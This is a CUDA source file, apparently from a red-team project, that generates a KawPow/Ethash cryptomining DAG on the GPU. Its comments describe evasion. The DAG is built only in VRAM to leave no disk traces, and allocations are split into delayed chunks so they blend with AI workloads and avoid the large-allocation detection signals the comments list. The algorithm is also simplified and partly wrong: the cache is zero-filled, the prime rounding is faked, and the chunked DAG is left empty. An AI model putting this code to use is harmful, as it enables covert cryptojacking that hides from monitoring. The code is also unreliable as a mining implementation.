#include "cuda_helpers.cuh"
#include "types.h"
#include <cstdint>
#include <cstring>

namespace redteam::kawpow {

// ============================================================================
// Ethash DAG Generation (For KawPow compatibility)
// ============================================================================

// **FNV Prime** (số nguyên tố FNV - for hashing)
constexpr uint32_t FNV_PRIME = 0x01000193;

/**
 * **FNV Hash Device** (băm FNV trên device - GPU implementation)
 */
__device__ __forceinline__ uint32_t fnv_hash(uint32_t v1, uint32_t v2) {
    return (v1 * FNV_PRIME) ^ v2;
}

/**
 * **DAG Item Generation Kernel** (kernel tạo DAG item - parallel DAG build)
 *
 * NGHIÊN CỨU: DAG generation có signature đặc trưng:
 * - Sequential memory writes (coalesced)
 * - FNV hash patterns in PTX
 * - Large memory allocation (4-5GB)
 *
 * DETECTION: Blue team có thể detect qua:
 * - cuMemAlloc() call với size ~4GB
 * - Kernel name chứa "dag" hoặc "ethash"
 * - Memory write pattern (sequential, 128-byte aligned)
 */
__global__ void KERNEL_NAME(generate_dag_items)(
    uint64_t* __restrict__ d_dag,
    const uint32_t* __restrict__ d_cache,
    uint32_t dag_size,
    uint32_t cache_size,
    uint32_t start_item
) {
    uint32_t item_index = start_item + blockIdx.x * blockDim.x + threadIdx.x;

    if (item_index >= dag_size) return;

    // Each DAG item is 64 bytes (16 x uint32_t)
    uint32_t mix[16];

    // Initialize from cache
    uint32_t cache_index = item_index % cache_size;

    #pragma unroll
    for (int i = 0; i < 16; i++) {
        mix[i] = d_cache[cache_index * 16 + i];
    }

    // First round of mixing
    mix[0] ^= item_index;

    #pragma unroll
    for (int i = 0; i < 16; i++) {
        mix[i] = fnv_hash(mix[i], mix[(i + 1) % 16]);
    }

    // Multiple rounds of DAG parents mixing
    #pragma unroll 8  // Partial unroll
    for (int parent = 0; parent < 256; parent++) {
        uint32_t parent_index = fnv_hash(item_index ^ parent, mix[parent % 16]) % dag_size;

        #pragma unroll
        for (int i = 0; i < 16; i++) {
            // Read parent item (16 x uint32_t)
            uint32_t parent_word = ((uint32_t*)d_dag)[parent_index * 16 + i];
            mix[i] = fnv_hash(mix[i], parent_word);
        }
    }

    // Write final DAG item (convert uint32_t[16] -> uint64_t[8])
    #pragma unroll
    for (int i = 0; i < 8; i++) {
        uint64_t word = ((uint64_t)mix[i * 2 + 1] << 32) | mix[i * 2];
        d_dag[item_index * 8 + i] = word;
    }
}

// ============================================================================
// Host DAG Generation Functions
// ============================================================================

/**
 * **Calculate DAG Size** (tính kích thước DAG - theo epoch)
 */
uint64_t calculate_dag_size(uint32_t epoch) {
    uint64_t size = DATASET_BYTES_INIT + DATASET_BYTES_GROWTH * epoch;

    // Round down to nearest prime (simplified - just round down to multiple of 128)
    size = (size / 128) * 128;

    return size / sizeof(uint64_t); // Return in uint64_t items
}

/**
 * **Calculate Cache Size** (tính kích thước cache - cho DAG generation)
 */
uint32_t calculate_cache_size(uint32_t epoch) {
    uint64_t size = CACHE_BYTES_INIT + CACHE_BYTES_GROWTH * epoch;
    return (size / 64) / sizeof(uint32_t); // Return in uint32_t items
}

/**
 * **Generate DAG on GPU** (tạo DAG trên GPU - in-memory, no disk writes)
 *
 * NGHIÊN CỨU ANTI-FORENSICS: DAG được tạo hoàn toàn trong VRAM,
 * không write file ra disk (/tmp/kawpow_dag_*).
 *
 * Blue Team Detection:
 * - Monitor cuMemAlloc() với size lớn (4-5GB)
 * - Check kernel launch patterns (sequential, many blocks)
 * - Memory bandwidth spike during generation
 *
 * @param device_id CUDA device
 * @param epoch DAG epoch (current block height / 7500)
 * @return Device pointer to generated DAG
 */
extern "C" uint64_t* generate_dag_in_vram(int device_id, uint32_t epoch) {
    CUDA_CHECK(cudaSetDevice(device_id));

    // Calculate sizes
    uint64_t dag_size = calculate_dag_size(epoch);
    uint32_t cache_size = calculate_cache_size(epoch);

    printf("[DAG-GEN] Epoch %u: DAG size = %.2f GB, Cache size = %.2f MB\n",
           epoch,
           (dag_size * sizeof(uint64_t)) / (1024.0 * 1024.0 * 1024.0),
           (cache_size * sizeof(uint32_t)) / (1024.0 * 1024.0));

    // Allocate cache (small, on device)
    uint32_t* d_cache;
    CUDA_CHECK(cudaMalloc(&d_cache, cache_size * sizeof(uint32_t)));

    // TODO: Implement cache generation (simplified for now - use zeros)
    CUDA_CHECK(cudaMemset(d_cache, 0, cache_size * sizeof(uint32_t)));

    // Allocate DAG (large, 4-5GB typically)
    uint64_t* d_dag;
    size_t dag_bytes = dag_size * sizeof(uint64_t);
    CUDA_CHECK(cudaMalloc(&d_dag, dag_bytes));

    printf("[DAG-GEN] Allocated %.2f GB VRAM for DAG\n", dag_bytes / (1024.0 * 1024.0 * 1024.0));

    // Generate DAG items in batches (for progress monitoring)
    const uint32_t BATCH_SIZE = 1024 * 1024; // 1M items per batch
    int threads_per_block = 256;

    for (uint32_t start = 0; start < dag_size / 16; start += BATCH_SIZE) {
        uint32_t batch_items = std::min(BATCH_SIZE, (uint32_t)(dag_size / 16 - start));
        int num_blocks = (batch_items + threads_per_block - 1) / threads_per_block;

        dim3 block(threads_per_block);
        dim3 grid(num_blocks);

        KERNEL_NAME(generate_dag_items)<<<grid, block>>>(
            d_dag,
            d_cache,
            dag_size / 16,  // Total items
            cache_size / 16,
            start
        );

        CUDA_CHECK(cudaDeviceSynchronize());

        // Progress report (every 25%)
        if (start % (dag_size / 16 / 4) == 0) {
            float progress = (float)start / (dag_size / 16) * 100.0f;
            printf("[DAG-GEN] Progress: %.1f%%\n", progress);
        }
    }

    printf("[DAG-GEN] DAG generation completed\n");

    // Free cache (no longer needed)
    CUDA_CHECK(cudaFree(d_cache));

    return d_dag;
}

/**
 * **Free DAG Memory** (giải phóng bộ nhớ DAG - cleanup)
 */
extern "C" void free_dag_memory(uint64_t* d_dag) {
    if (d_dag != nullptr) {
        CUDA_CHECK(cudaFree(d_dag));
    }
}

// ============================================================================
// Progressive DAG Loading (Evasion technique)
// ============================================================================

/**
 * **Progressive DAG Allocation** (cấp phát DAG lũy tiến - avoid single large alloc)
 *
 * NGHIÊN CỨU EVASION: Thay vì 1 allocation 4GB (red flag),
 * chia thành nhiều chunks nhỏ để blend với AI tensor allocations.
 *
 * @param device_id CUDA device
 * @param epoch DAG epoch
 * @param num_chunks Number of chunks to split into (e.g., 16)
 * @return Vector of device pointers
 */
extern "C" std::vector<void*> generate_progressive_dag(
    int device_id,
    uint32_t epoch,
    int num_chunks
) {
    std::vector<void*> dag_chunks;

    uint64_t total_dag_size = calculate_dag_size(epoch);
    uint64_t chunk_size = total_dag_size / num_chunks;

    for (int i = 0; i < num_chunks; i++) {
        void* d_chunk;
        size_t chunk_bytes = chunk_size * sizeof(uint64_t);

        CUDA_CHECK(cudaMalloc(&d_chunk, chunk_bytes));
        dag_chunks.push_back(d_chunk);

        // Sleep between allocations to spread out over time
        if (i < num_chunks - 1) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }

        printf("[PROGRESSIVE-DAG] Chunk %d/%d allocated (%.2f MB)\n",
               i + 1, num_chunks, chunk_bytes / (1024.0 * 1024.0));
    }

    // TODO: Generate DAG data across chunks (more complex, skip for now)

    return dag_chunks;
}

} // namespace redteam::kawpow
